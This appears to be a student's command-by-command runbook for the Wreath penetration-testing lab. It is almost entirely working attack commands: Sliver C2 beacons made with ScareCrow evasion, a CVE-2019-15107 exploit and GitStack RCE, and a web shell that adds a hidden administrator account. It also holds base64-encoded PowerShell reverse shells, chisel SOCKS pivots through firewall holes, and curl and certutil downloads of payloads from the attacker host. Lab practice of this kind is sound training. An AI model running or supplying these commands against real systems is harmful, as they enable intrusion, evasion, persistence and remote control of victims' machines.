# Wreath CMD-by-CMDs

```bash
sed -i 's/10.50.106.204/10.50.106.204/g' *-CMD-by-CMDs.md
sed -i 's/10.200.105.200/10.200.105.200/g' *-CMD-by-CMDs.md
sed -i 's/10.200.105.150/10.200.105.150/g' *-CMD-by-CMDs.md
sed -i 's/10.200.105.100/10.200.105.100/g' *-CMD-by-CMDs.md
```

```bash
echo "10.200.X.200 thomaswreath.thm thomaswreath.thm.evil.com" | sudo tee -a /etc/hosts

# Sliver
generate beacon --http 10.50.106.204:2222 --arch amd64 --os linux --save /home/kali/Wreath/PROD-SERV-S


generate beacon --tcp-pivot  10.200.105.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S-Pivot.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

netsh advfirewall firewall add rule name="nvm-sliver-tcp-pivot" dir=in action=allow protocol=tcp localport=9898

netsh advfirewall firewall add rule name="nvm-sliver-tcp-pivot" dir=out action=allow protocol=tcp localport=9898

generate beacon --http 10.200.105.200:10005 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S.bin -f shellcode -G

/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# mv to match its parent directory

generate beacon --http 10.200.105.150:10010 --arch amd64 --os windows --save /home/kali/Wreath/PERSONAL.bin -f shellcode -G

/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/PERSONAL.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

http -L 10.50.106.204 -l 2222
http -L 10.50.106.204 -l 10005
http -L 10.50.106.204 -l 10010

# Prod 
# CVE foothold
cd CVE-2019-15107 
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 CVE-2019-15107.py


curl http://10.50.106.204/chisel -o chisel
curl http://10.50.106.204/PROD-SERV-S -o systemCtl
curl http://10.50.106.204/Socats/socatx64.bin -o socat

curl http://10.50.106.204/chisel.exe -o chisel.exe
curl http://10.50.106.204/ppc-Powerpnt.exe -o Powerpnt.exe
curl http://10.50.106.204/git-cmd.exe -o cmd.exe

chmod +x *
nohup ./systemCtl &
./chisel server -host 10.50.106.204 --reverse --socks5 -p 10000
nohup ./chisel client 10.50.106.204:10000 R:10001:socks &
# modify /etc/proxychains4.conf socks5 127.0.0.1 10001

# Git Sliver -> prod-server -> chisel 
# Prod



# For git-serv reverse shell
nohup ./chisel client 10.50.106.204:10000 R:10005:socks &
firewall-cmd --zone=public --add-port 9898/tcp

for i in $(seq 10001 10010); do firewall-cmd --zone=public --add-port $i/tcp; done

# gitstack, add a rule and a reverse socks proxy 
netsh advfirewall firewall add rule name="nvm-sliver" dir=in action=allow protocol=tcp localport=10005
netsh advfirewall firewall add rule name="nvm-sliver" dir=out action=allow protocol=tcp localport=10005


# start-job { .\chisel.exe client 10.50.106.204:10000 R:10005:10.200.105.150:10005:10.200.105.200:socks  }

# Personal Sliver -> git -> prod-server -> chisel 
# Prod
firewall-cmd --zone=public --add-port 10010/tcp
nohup ./chisel client 10.50.106.204:10000 R:10010:socks &
# gitstack, add a rule and a reverse socks proxy 
netsh advfirewall firewall add rule name="nvmChisel-PPC" dir=in action=allow protocol=tcp localport=10010
start-job { .\chisel.exe client 10.50.106.204:10000 R:10010:10.200.105.150:100010:10.200.105.200:socks  }




# Reverse Port forward for gitstack exploit
nohup ./chisel client 10.50.106.204:10000 R:127.0.0.1:10002:10.200.105.150:80 &
# For git-serv reverse shell
nohup ./chisel client 10.50.106.204:10000 R:10003:socks &



python2 gitstackRCE.py

# Do what you are told..
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+user+nvm+nvmNVM69!+/add'
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+Administrators+nvm+/add'
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+"Remote+Desktop+Users"+nvm+/add'


start /B powershell.exe -EncodedCommand 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA1ADcALgAyADAAMAAnACwAMQAwADAAMAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA' 


# 
# For some reason this did not work
# 
# Setup socat for relay with chisel coloured tears..
nohup ./socat tcp-l:10004 tcp:10.50.106.204:10004 &
# Bypass url encoding issues
iconv -f ASCII -t UTF-16LE rPwsh-gitserv.txt | base64 | tr -d "\n"
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=powershell.exe+-EncodedCommand+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA1ADcALgAyADAAMAAnACwAMQAwADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA'
# powershell shell
nohup ./socat tcp-l:10003 tcp:10.50.106.204:10003 &
# Socat relay on prod
rlwrap ncat -lvnp 10003

# EvilWin RM + xfreerdp as we need UAC
proxychains4 evil-winrm -u 'nvm' -p 'nvmNVM69!' -i 10.200.105.150
proxychains4 xfreerdp /v:10.200.105.150 /u:nvm /p:'nvmNVM69!' +clipboard /dynamic-resolution 

# Very cool RDP command
`xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
# Very cool background in Dos
start /B program

# 
start /B powershell.exe -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA1ADcALgAyADAAMAAnACwAMQAwADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

# cmd = GIT-SERV-S.bin
# Pwerpnt.exe = PROD.bin
start-job { cmd.exe }

# Another method
# Host web server on Prod for infil beacons
nohup python3 -m http.server 8443 &
certutil.exe -urlcache -f -split http://10.200.96.200:8443/Excel.exe -o Excel.exe






```


